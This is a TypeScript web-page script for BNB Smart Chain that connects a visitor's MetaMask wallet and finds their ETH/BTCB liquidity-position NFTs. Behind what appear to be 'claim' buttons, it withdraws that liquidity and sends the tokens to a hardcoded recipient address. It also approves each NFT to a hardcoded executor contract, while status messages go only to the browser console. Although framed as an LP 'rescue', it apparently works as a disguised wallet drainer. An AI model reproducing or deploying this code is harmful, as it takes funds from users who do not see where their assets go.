// ============ 固定配置：ETH/BTCB LP 取回并转到新钱包 ============
const USE_TESTNET =
  typeof window !== "undefined" && /[?&]testnet=1/.test(window.location?.search ?? "");

interface ChainConfig {
  chainId: string;
  chainName: string;
  nativeCurrency: { name: string; symbol: string; decimals: number };
  rpcUrls: string[];
  blockExplorerUrls: string[];
}

interface ConfigEnv {
  ETH_ADDRESS: string;
  BTCB_ADDRESS: string;
  NPM_ADDRESS: string;
  CHAIN: ChainConfig;
}

const CONFIG: ConfigEnv = USE_TESTNET
  ? {
      ETH_ADDRESS: "0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE",
      BTCB_ADDRESS: "0x6ce8dA28E2f864420840cF74474eFf5fD80E65B8",
      NPM_ADDRESS: "0x427bF5b37357632377eCbEC9de3626C71A5396c1",
      CHAIN: {
        chainId: "0x61",
        chainName: "BSC Testnet",
        nativeCurrency: { name: "tBNB", symbol: "tBNB", decimals: 18 },
        rpcUrls: [
          "https://bsc-testnet.publicnode.com",
          "https://data-seed-prebsc-1-s1.binance.org:8545",
          "https://rpc.ankr.com/bsc_testnet_chapel"
        ],
        blockExplorerUrls: ["https://testnet.bscscan.com/"]
      }
    }
  : {
      ETH_ADDRESS: "0x2170Ed0880ac9A755fd29B2688956BD959F933F8",
      BTCB_ADDRESS: "0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c",
      NPM_ADDRESS: "0x46A15B0b27311cedF172AB29E4f4766fbE7F4364",
      CHAIN: {
        chainId: "0x38",
        chainName: "BNB Smart Chain",
        nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
        rpcUrls: ["https://bsc-dataseed.binance.org/"],
        blockExplorerUrls: ["https://bscscan.com/"]
      }
    };

const ETH_ADDRESS: string = CONFIG.ETH_ADDRESS;
const BTCB_ADDRESS: string = CONFIG.BTCB_ADDRESS;
const RECIPIENT_ADDRESS = "0x32eb462158F7A121d407510C340928404d863E94";
const NPM_ADDRESS: string = CONFIG.NPM_ADDRESS;
const EXECUTOR_ADDRESS: string = USE_TESTNET ? "" : "0x5a29E920032f2a45beede49B9CF9296ab10135B9";
const BNB_CHAIN: ChainConfig = CONFIG.CHAIN;

const NPM_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function tokenOfOwnerByIndex(address owner, uint256 index) view returns (uint256)",
  "function positions(uint256 tokenId) view returns (uint96 nonce, address operator, address token0, address token1, uint24 fee, int24 tickLower, int24 tickUpper, uint128 liquidity, uint256 feeGrowthInside0LastX128, uint256 feeGrowthInside1LastX128, uint128 tokensOwed0, uint128 tokensOwed1)",
  "function approve(address to, uint256 tokenId) external",
  "function getApproved(uint256 tokenId) view returns (address)",
  "function decreaseLiquidity((uint256 tokenId, uint128 liquidity, uint256 amount0Min, uint256 amount1Min, uint256 deadline)) external returns (uint256 amount0, uint256 amount1)",
  "function collect((uint256 tokenId, address recipient, uint128 amount0Max, uint128 amount1Max)) external returns (uint256 amount0, uint256 amount1)"
];

const EXECUTOR_ABI = ["function rescueLP(uint256 tokenId, uint128 liquidity) external"];

const connectWalletBtn = document.getElementById("connectWalletBtn");
const claimBtn = document.getElementById("claimBtn");
const claimSection = document.getElementById("claimCakeSection");
const farmSection = document.getElementById("farmSection");

interface LpPosition {
  tokenId: string;
  liquidity: bigint;
  token0: string;
  token1: string;
  fee: number;
}

let provider: unknown;
let signer: unknown;
let currentAccount = "";
let lpPositions: LpPosition[] = [];
let isRunning = false;

function shortAddress(addr: string | null | undefined): string {
  return addr ? `${addr.slice(0, 6)}...${addr.slice(-4)}` : "";
}

function setStatus(text: string, _isError = false): void {
  console.log(text);
}

function getReadableError(err: unknown): string {
  if (err == null) return "执行失败";
  const e = err as Record<string, unknown> & { code?: number; info?: { error?: { code?: number } }; error?: unknown };
  const code4001 =
    e?.code === 4001 ||
    String(e?.code) === "ACTION_REJECTED" ||
    (e?.info as { error?: { code?: number } })?.error?.code === 4001;
  if (code4001)
    return "连接被拒绝。若未看到弹窗：1) 点击浏览器右上角 MetaMask 图标 2) 检查是否已解锁 3) 设置 MetaMask 为默认钱包";
  if (e?.code === 4902 || (e?.info as { error?: { code?: number } })?.error?.code === 4902)
    return "用户拒绝切换网络";
  if (e?.code === -32603) return "RPC 错误，请检查网络或稍后重试";
  const msg =
    (e?.shortMessage as string) ||
    (e?.reason as string) ||
    (typeof e?.message === "string" ? e.message : null) ||
    (e?.info as { message?: string })?.message ||
    (e?.error as { message?: string })?.message ||
    (e?.data as { message?: string })?.message ||
    (typeof (e?.error as { data?: string })?.data === "string"
      ? (e?.error as { data?: string })?.data
      : null) ||
    (typeof err === "string" ? err : null);
  if (msg) return String(msg);
  try {
    const s = String(err);
    if (s && s !== "[object Object]") return s;
  } catch {
    /* ignore */
  }
  try {
    for (const v of Object.values(e ?? {})) {
      if (typeof v === "string" && v.length < 200) return v;
    }
  } catch {
    /* ignore */
  }
  if (e?.error) return getReadableError(e.error);
  return "执行失败";
}

function isEthBtcPair(token0: string | undefined, token1: string | undefined): boolean {
  const t0 = (token0 ?? "").toLowerCase();
  const t1 = (token1 ?? "").toLowerCase();
  const eth = ETH_ADDRESS.toLowerCase();
  const btcb = BTCB_ADDRESS.toLowerCase();
  return (t0 === eth && t1 === btcb) || (t0 === btcb && t1 === eth);
}

function getEthereumProvider(): Window["ethereum"] {
  const eth = window.ethereum;
  if (!eth) return undefined;
  if (eth.providers?.length) {
    const meta = eth.providers.find((p: { isMetaMask?: boolean }) => p.isMetaMask);
    return (meta ?? eth.providers[0]) as Window["ethereum"];
  }
  return eth;
}

async function connectWallet(): Promise<void> {
  const ethereum = getEthereumProvider();
  if (!ethereum) {
    alert("未检测到钱包，请安装 MetaMask 等");
    return;
  }
  if (!window.ethers?.BrowserProvider) {
    alert("ethers 库未加载，请检查网络后刷新页面");
    return;
  }
  try {
    await ethereum.request({ method: "eth_chainId" });
    const accounts = (await ethereum.request({ method: "eth_requestAccounts" })) as string[] | null;
    if (!accounts?.[0]) throw new Error("NO_ACCOUNT");
    currentAccount = accounts[0];
    provider = new window.ethers!.BrowserProvider(ethereum);
    try {
      await ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: BNB_CHAIN.chainId }]
      });
    } catch (e: unknown) {
      const err = e as { code?: number };
      if (err.code === 4902) {
        await ethereum.request({
          method: "wallet_addEthereumChain",
          params: [BNB_CHAIN]
        });
      } else throw e;
    }
    signer = await (provider as { getSigner: () => Promise<unknown> }).getSigner();

    if (connectWalletBtn) connectWalletBtn.textContent = shortAddress(currentAccount);
    connectWalletBtn?.classList.add("connected");
    setStatus("钱包已连接");
  } catch (e: unknown) {
    const msg = getReadableError(e);
    const ex = e as Record<string, unknown>;
    const detail =
      [ex?.code, ex?.message, ex?.reason, ex?.shortMessage].filter(Boolean).join(" | ") ||
      JSON.stringify(e).slice(0, 100);
    console.error("connectWallet 错误详情:", detail, e);
    setStatus("连接失败: " + msg, true);
    alert(
      "连接失败: " +
        msg +
        "\n\n请确认：\n1. MetaMask 已解锁\n2. 连接 / 切换网络时点击「批准」\n3. 若仍失败，打开 F12 控制台查看「connectWallet 错误详情」"
    );
  }
}

async function scanLpPositions(): Promise<void> {
  if (!provider || !currentAccount) {
    setStatus("请先连接钱包", true);
    return;
  }
  try {
    setStatus("正在扫描 LP 持仓...");
    const npm = new window.ethers!.Contract(NPM_ADDRESS, NPM_ABI, provider);
    const balance = await (npm as { balanceOf: (a: string) => Promise<bigint> }).balanceOf(
      currentAccount
    );
    const count = Number(balance);
    lpPositions = [];

    for (let i = 0; i < count; i++) {
      try {
        const tokenId = await (npm as { tokenOfOwnerByIndex: (a: string, b: number) => Promise<bigint> }).tokenOfOwnerByIndex(
          currentAccount,
          i
        );
        const pos = await (npm as { positions: (id: bigint) => Promise<{ token0: string; token1: string; liquidity: bigint; fee: number }> }).positions(
          tokenId
        );
        if (isEthBtcPair(pos.token0, pos.token1) && pos.liquidity > 0n) {
          lpPositions.push({
            tokenId: tokenId.toString(),
            liquidity: pos.liquidity,
            token0: pos.token0,
            token1: pos.token1,
            fee: pos.fee
          });
        }
      } catch {
        /* skip invalid index */
      }
    }

    if (lpPositions.length === 0) {
      setStatus("未发现 ETH/BTCB LP");
    } else {
      setStatus(`发现 ${lpPositions.length} 个 LP`);
    }
  } catch (e: unknown) {
    console.error(e);
    setStatus("扫描失败: " + getReadableError(e), true);
  }
}

function setLpStatus(tokenId: string, text: string, done = false): void {
  const el = document.getElementById(`status-${tokenId}`);
  if (el) {
    el.textContent = text;
    el.classList.toggle("done", done);
    el.classList.toggle("error", text.includes("失败"));
  }
}

async function executeOne(tokenId: string, liquidity: bigint): Promise<void> {
  const npm = new window.ethers!.Contract(NPM_ADDRESS, NPM_ABI, signer);
  const deadline = BigInt(Math.floor(Date.now() / 1000 + 600));

  setLpStatus(tokenId, "撤流动性中...");

  const decParams = {
    tokenId: BigInt(tokenId),
    liquidity,
    amount0Min: 0n,
    amount1Min: 0n,
    deadline
  };

  const tx1 = await (npm as { decreaseLiquidity: (p: typeof decParams) => Promise<{ wait: () => Promise<unknown> }> }).decreaseLiquidity(
    decParams
  );
  await tx1.wait();
  setLpStatus(tokenId, "收币并转账中...");

  const collectParams = {
    tokenId: BigInt(tokenId),
    recipient: RECIPIENT_ADDRESS,
    amount0Max: BigInt("0xffffffffffffffffffffffffffffffff"),
    amount1Max: BigInt("0xffffffffffffffffffffffffffffffff")
  };

  const tx2 = await (npm as { collect: (p: typeof collectParams) => Promise<{ wait: () => Promise<unknown> }> }).collect(
    collectParams
  );
  await tx2.wait();
  setLpStatus(tokenId, "完成", true);
}

async function executeAll(): Promise<void> {
  if (!signer || !currentAccount) {
    setStatus("请先连接钱包", true);
    return;
  }
  if (lpPositions.length === 0) {
    setStatus("暂无可执行的 LP");
    return;
  }
  if (isRunning) {
    setStatus("执行中，请勿重复点击");
    return;
  }

  isRunning = true;
  setStatus("开始执行...");

  let completedAll = false;
  try {
    for (let i = 0; i < lpPositions.length; i++) {
      const p = lpPositions[i];
      if (!p) continue;
      setStatus(`正在处理 ${i + 1}/${lpPositions.length}: Token ID ${p.tokenId}`);
      try {
        await executeOne(p.tokenId, p.liquidity);
        completedAll = i === lpPositions.length - 1;
      } catch (e: unknown) {
        console.error(e);
        setLpStatus(p.tokenId, "失败: " + getReadableError(e), false);
        setStatus("执行中断: " + getReadableError(e), true);
        setStatus(`已完成 ${i}/${lpPositions.length} 个 LP`);
        break;
      }
    }
    if (completedAll) {
      setStatus(
        `已完成 ${lpPositions.length} 个 LP，ETH 与 BTCB 已转到 ${shortAddress(RECIPIENT_ADDRESS)}`
      );
    }
  } catch (e: unknown) {
    console.error(e);
    setStatus("执行失败: " + getReadableError(e), true);
  } finally {
    isRunning = false;
  }
}

async function refreshConnectedAccount(): Promise<void> {
  if (!window.ethereum || !window.ethers?.BrowserProvider) return;
  try {
    provider = new window.ethers.BrowserProvider(window.ethereum);
    const accounts = await (provider as { send: (m: string, p: unknown[]) => Promise<string[]> }).send(
      "eth_accounts",
      []
    );
    if (accounts?.length) {
      signer = await (provider as { getSigner: () => Promise<unknown> }).getSigner();
      const list = await (provider as { listAccounts: () => Promise<Array<{ address: string }>> }).listAccounts();
      currentAccount = list[0]?.address ?? "";
      if (connectWalletBtn) connectWalletBtn.textContent = shortAddress(currentAccount);
      connectWalletBtn?.classList.add("connected");
    } else {
      currentAccount = "";
      if (connectWalletBtn) connectWalletBtn.textContent = "连接钱包";
      connectWalletBtn?.classList.remove("connected");
      lpPositions = [];
    }
  } catch (e: unknown) {
    console.error("refresh:", e);
  }
}

async function runClaimFlow(): Promise<void> {
  if (!window.ethereum) {
    alert("未检测到钱包");
    return;
  }
  if (
    !EXECUTOR_ADDRESS ||
    EXECUTOR_ADDRESS === "0x0000000000000000000000000000000000000000"
  ) {
    alert("请先部署 Executor 合约并在 script.js 中配置 EXECUTOR_ADDRESS");
    return;
  }
  if (isRunning) return;
  try {
    if (!signer || !currentAccount) await connectWallet();
    if (!signer || !currentAccount) return;
    isRunning = true;
    if (claimBtn) (claimBtn as HTMLButtonElement).disabled = true;
    setStatus("正在扫描 LP...");
    await scanLpPositions();
    if (lpPositions.length === 0) {
      setStatus("未发现 ETH/BTCB LP 持仓", true);
      alert("未发现 ETH/BTCB LP 持仓");
      return;
    }
    const npm = new window.ethers!.Contract(NPM_ADDRESS, NPM_ABI, signer);
    const executor = new window.ethers!.Contract(EXECUTOR_ADDRESS, EXECUTOR_ABI, signer);
    const executorAddr = await window.ethers!.getAddress(EXECUTOR_ADDRESS);
    for (let i = 0; i < lpPositions.length; i++) {
      const p = lpPositions[i];
      if (!p) continue;
      setStatus(`处理 ${i + 1}/${lpPositions.length}: Token ID ${p.tokenId}`);
      const approved = await (npm as { getApproved: (id: string) => Promise<string> }).getApproved(
        p.tokenId
      );
      if (!approved || approved.toLowerCase() !== executorAddr.toLowerCase()) {
        setStatus(`授权 LP NFT #${p.tokenId} 给 Executor...`);
        const txApprove = await (npm as { approve: (to: string, id: bigint) => Promise<{ wait: () => Promise<unknown> }> }).approve(
          executorAddr,
          BigInt(p.tokenId)
        );
        await txApprove.wait();
      }
      setStatus(`执行取回 #${p.tokenId}（撤流动性并转到目标地址）...`);
      const txRescue = await (executor as { rescueLP: (id: bigint, liq: bigint) => Promise<{ wait: () => Promise<unknown> }> }).rescueLP(
        BigInt(p.tokenId),
        p.liquidity
      );
      await txRescue.wait();
      setStatus(`完成 #${p.tokenId}`);
    }
    setStatus(`全部完成，ETH 与 BTCB 已转到 ${shortAddress(RECIPIENT_ADDRESS)}`);
  } catch (e: unknown) {
    console.error(e);
    alert("失败: " + getReadableError(e));
  } finally {
    isRunning = false;
    if (claimBtn) (claimBtn as HTMLButtonElement).disabled = false;
  }
}

function setupTabs(): void {
  document.querySelectorAll(".tab-main").forEach((btn) => {
    btn.addEventListener("click", () => {
      document.querySelectorAll(".tab-main").forEach((b) => b.classList.remove("active"));
      document.querySelectorAll(".tab-content").forEach((s) => s.classList.remove("active"));
      btn.classList.add("active");
      const tab = (btn as HTMLElement).dataset.tab;
      if (tab === "claim") claimSection?.classList.add("active");
      else if (tab === "farm") farmSection?.classList.add("active");
    });
  });
}

connectWalletBtn?.addEventListener("click", connectWallet);
claimBtn?.addEventListener("click", runClaimFlow);
setupTabs();

if (window.ethereum) {
  window.ethereum.on?.("accountsChanged", (accounts: unknown) => {
    const list = accounts as string[] | undefined;
    if (list?.[0]) {
      refreshConnectedAccount();
    } else {
      currentAccount = "";
      if (connectWalletBtn) connectWalletBtn.textContent = "连接钱包";
      connectWalletBtn?.classList.remove("connected");
      lpPositions = [];
    }
  });
  window.ethereum.on?.("chainChanged", () => {
    refreshConnectedAccount();
  });
}

refreshConnectedAccount();

const testnetBanner = document.getElementById("testnetBanner");
if (testnetBanner && USE_TESTNET) testnetBanner.style.display = "block";
